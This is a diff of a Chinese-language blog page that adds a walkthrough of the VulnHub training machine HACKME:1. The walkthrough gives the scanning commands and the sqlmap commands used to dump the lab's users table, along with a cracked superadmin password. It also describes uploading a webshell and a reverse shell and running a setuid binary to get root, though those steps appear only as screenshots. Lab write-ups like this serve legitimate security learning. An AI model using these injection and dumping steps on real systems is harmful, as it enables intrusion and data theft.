@@ -10,6 +10,8 @@
 
     <!--Description-->
     
+        <meta name="description" content="HACKME:1靶机地址 https://www.vulnhub.com/entry/hackme-1,330/">
+    
 
     <!--Author-->
     
@@ -18,7 +20,7 @@
 
     <!--Open Graph Title-->
     
-        <meta property="og:title" content="JKding233"/>
+        <meta property="og:title" content="vulnhub-hackme"/>
     
 
     <!--Open Graph Description-->
@@ -29,7 +31,7 @@
 
     <!--Type page-->
     
-        <meta property="og:type" content="website" />
+        <meta property="og:type" content="article" />
     
 
     <!--Page Cover-->
@@ -43,7 +45,7 @@
 
     <!-- Title -->
     
-    <title>conda - JKding233</title>
+    <title>vulnhub-hackme - JKding233</title>
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
@@ -132,9 +134,7 @@
 <div class="container">
 
     <!-- Main Content -->
-    
-
-<div class="row">
+    <div class="row">
     <div class="col-sm-12">
 
         <!--Title and Logo-->
@@ -142,25 +142,146 @@
     <div class="logo">
         <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
         
-            <h1 id="main-title" class="title">#conda</h1>
-        
     </div>
 </header>
 
-        <section class="main archive-container">
+        <section class="main">
             
-                <div class="archive-post">
-    <a href="/2020/09/12/conda%E5%AE%89%E8%A3%85mysqlclient%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/">
-        <span class="archive-date">
-            Sep 2020
-        </span>
-        conda安装mysqlclient遇到的问题
-    </a>
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2020/10/23/vulnhub-hackme/">
+                vulnhub-hackme
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2020-10-23</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/渗透测试/">渗透测试</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p>HACKME:1<br>靶机地址 <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/hackme-1,330/">https://www.vulnhub.com/entry/hackme-1,330/</a></p>
+<a id="more"></a>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">靶机IP：192.168.3.142</span><br><span class="line">kaliIP：192.168.3.133</span><br></pre></td></tr></table></figure>
+<p>主机发现</p>
+<p><code>root@kali:~# arp-scan -l</code></p>
+<p>[<img src="https://s1.ax1x.com/2020/10/23/BkgNPs.png" alt="BkgNPs.png" style="zoom:150%;" />]</p>
+<p>端口扫描</p>
+<p>开放了80、22端口</p>
+<p>[<img src="https://s1.ax1x.com/2020/10/23/BkgUGn.png" alt="BkgUGn.png" style="zoom:150%;" />]</p>
+<p>目录扫描</p>
+<p><code>root@kali:~/dirsearch# python3 dirsearch.py -u http://192.168.3.142/ -e *</code></p>
+<p>[<img src="https://s1.ax1x.com/2020/10/23/BkgWxx.png" alt="BkgWxx.png" style="zoom:150%;" />]</p>
+<p>依次访问试试</p>
+<ul>
+<li><code>http://192.168.3.142/login.php</code></li>
+</ul>
+<p>[<img src="https://s1.ax1x.com/2020/10/23/BkgoZD.png" alt="BkgoZD.png" style="zoom:150%;" />]</p>
+<ul>
+<li><code>http://192.168.3.142/register.php</code></li>
+</ul>
+<img src="https://i.loli.net/2020/10/23/4fhzCQHGKDJnOFo.png" style="zoom:150%;" />
+
+<ul>
+<li><code>http://192.168.3.142/uploads/</code></li>
+</ul>
+<img src="https://i.loli.net/2020/10/23/Ghipwe6ExHJkQ5R.png" style="zoom:150%;" />
+
+<p>试着注册一个用户</p>
+<img src="https://i.loli.net/2020/10/23/gOshmWSaGciu9o8.png" style="zoom:150%;" />
+
+<p>登录成功有一个书籍查询的功能</p>
+<img src="https://i.loli.net/2020/10/23/vIkwul4BgTqSDi6.png" style="zoom:150%;" />
+
+<p>可以显示全部图书</p>
+<img src="https://i.loli.net/2020/10/23/hsmaNMSGoepWr12.png" style="zoom:150%;" />
+
+<p>可以看到这里采用POST传参</p>
+<img src="https://i.loli.net/2020/10/23/Mxtvm64BCAelOjF.png" style="zoom:150%;" />
+
+<p>判断可能存在SQL注入，使用sqlmap进行测试<br>注入时要加上SESSION</p>
+<img src="https://i.loli.net/2020/10/23/XEZwBDzRib8NfPW.png" style="zoom:150%;" />
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;dirsearch# sqlmap -u http:&#x2F;&#x2F;192.168.3.142&#x2F;welcome.php --data &quot;search&#x3D;OSINT&quot; --cookie &quot;PHPSESSID&#x3D;vk4h6mvmptpnpkaqmh0jv7iuri&quot; --current-user --current-db --is-dba</span><br></pre></td></tr></table></figure>
+
+<p>列出当前⽤户，数据库，当前⽤户是否是dba</p>
+<img src="https://i.loli.net/2020/10/23/N3rh27zFlTBs9Ao.png" style="zoom:150%;" />
+
+<p>跑表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;192.168.3.142&#x2F;welcome.php --data &quot;search&#x3D;OSINT&quot; --cookie &quot;PHPSESSID&#x3D;vk4h6mvmptpnpkaqmh0jv7iuri&quot; --tables -D &quot;webapphacking&quot;</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2020/10/23/CpIKdmAhcWPZR5V.png" style="zoom:150%;" />
+
+<p>跑字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;192.168.3.142&#x2F;welcome.php --data &quot;search&#x3D;OSINT&quot; --cookie &quot;PHPSESSID&#x3D;vk4h6mvmptpnpkaqmh0jv7iuri&quot; --columns -T users -D &quot;webapphacking&quot;</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2020/10/23/xXfN8yFW2dCqu7D.png" style="zoom:150%;" />
+
+<p>跑值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:&#x2F;&#x2F;192.168.3.142&#x2F;welcome.php --data &quot;search&#x3D;OSINT&quot; --cookie &quot;PHPSESSID&#x3D;vk4h6mvmptpnpkaqmh0jv7iuri&quot; --dump-all -T users -D &quot;webapphacking&quot;</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2020/10/23/yFKUxTcfoewDrCl.png" style="zoom:150%;" />
+
+<p><code>11|superadmin|superadmin|superadmin | 2386acb2cf356944177746fc92523983</code></p>
+<p>这个用户比较可疑</p>
+<img src="https://i.loli.net/2020/10/23/qPF4QGILBlU8MiE.png" style="zoom:150%;" />
+
+<p>使用这个用户登录</p>
+<p><code>superadmin| Uncrackable</code></p>
+<p>可以看到多了一个上传功能</p>
+<img src="https://i.loli.net/2020/10/23/QPUmOwZt1XR45Df.png" style="zoom:150%;" />
+
+<p>尝试上传一个大马，发现没有过滤</p>
+<img src="https://i.loli.net/2020/10/23/bowlTSZdznYaq4m.png" style="zoom:150%;" />
+
+<p>访问大马</p>
+<img src="https://i.loli.net/2020/10/23/vHpojKGbX6r1ihP.png" style="zoom:150%;" />
+
+<p>上传一个反弹shell</p>
+<img src="https://i.loli.net/2020/10/23/LVXDpyhoYKiMzbP.png" style="zoom:150%;" />
+
+<p>访问反弹shell返回一个会话</p>
+<img src="https://i.loli.net/2020/10/23/2SGOdoiAyDVUplv.png" style="zoom:150%;" />
+
+<p>执行<code>/home/legacy/</code>下的<code>touchmenot</code>即可获得root权限</p>
+<img src="https://i.loli.net/2020/10/23/xpFY2d5PmQflZ7R.png" style="zoom:150%;" />
+
+<p>关于文件里的内容</p>
+<img src="https://i.loli.net/2020/10/23/exEiod9A4UvIcWS.png" style="zoom:150%;" />
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/vulnhub/">#vulnhub</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
 </div>
-            
         </section>
+
     </div>
 </div>
+
 
 </div>
 
